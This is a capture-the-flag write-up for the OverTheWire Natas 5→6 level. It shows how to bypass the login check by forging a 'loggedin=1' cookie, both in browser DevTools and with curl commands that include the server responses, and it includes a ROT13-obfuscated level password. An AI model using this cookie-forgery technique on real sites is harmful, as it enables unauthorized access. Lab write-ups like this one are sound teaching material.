# Write-up: Natas 05 → 06  
**Date:** 2025-12-05  

## Obfuscated password (ROT13)

`0EbWjUqFXJSGLE5JhvNrjnhFhAnOKarq`

## OBJECTIVE

> "Access disallowed. You are not logged in."

## PURPOSE ##

This level teaches another form of insecure trust in **client-provided metadata**, but this time the mechanism isn’t a header (as in Natas 4) — it’s a **cookie**. The page says “You are not logged in” yet provides no login form, no POST request, no username field, and nothing in the HTML source. That means the login state must be tracked **elsewhere**, and the only remaining place a website can store per-user state on the client is through **cookies**. 

From here we have two valid entry points via either a browser-first approach or terminal-first approach. Beginning with the former: in the browser's DevTools' Application tab we can look under Storage for Cookies: 

```
|   Name   | Value |              Domain               | Path | Expires / Max-Age | Size | Priority |
|----------|-------|-----------------------------------|------|-------------------|------|----------|
| loggedin |   0   | natas5.natas.labs.overthewire.org |   /  |      Session      |   9  |  Medium  |
```
That is our attack surface. Alternately, we could begin by using `curl` to inspect the HTTP headers:

```bash
curl -u natas5:'<password-for-natas5>' \ -I http://natas5.natas.labs.overthewire.org/
```

This returns:
```
HTTP/1.1 200 OK
Date: Sat, 05 Dec 2025 21:41:31 GMT
Server: Apache/2.4.58 (Ubuntu)
Set-Cookie: loggedin=0
Content-Type: text/html; charset=UTF-8
```
This indicates the server is using the cookie as a simple boolean flag. But cookies are entirely under client control. Any browser, script, or command-line tool can rewrite them, making this a textbook example of why **client-side session variables must never be trusted without server-side validation**.

## SOLUTIONS ##

We can forge/overwrite the cookie in either the browser or ther terminal. In browser, still in our DevTools --> Application --> Cookies location, we just need to double-click the Value cell and change `0` to `1`. After refreshing the page we see `Access granted. The password for natas6 is <password>.`. In terminal we can forge the cookie by sending a modified value with either the high-level `-b`/`--cookie` flag or the low-level `-H`/`--header` flag:
```
curl -u natas5:'<password>' -b "loggedin=1" http://natas5.natas.labs.overthewire.org/
```
or
```
curl -u natas5:'<password>' -H "Cookie: loggedin=1" http://natas5.natas.labs.overthewire.org/
```
Both commands result in the same HTTP header being sent to the server, `Cookie: loggedin=1`. The server accepts this client-supplied value at face value and responds:
```
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas5", "pass": "<natas5 password>" };</script></head>
<body>
<h1>natas5</h1>
<div id="content">
Access granted. The password for natas6 is <natas6 password></div>
</body>
</html>
```

___

Writeup author: **Jeremy Ray Jewell**  
[GitHub](https://github.com/jeremyrayjewell)  
[LinkedIn](https://www.linkedin.com/in/jeremyrayjewell)


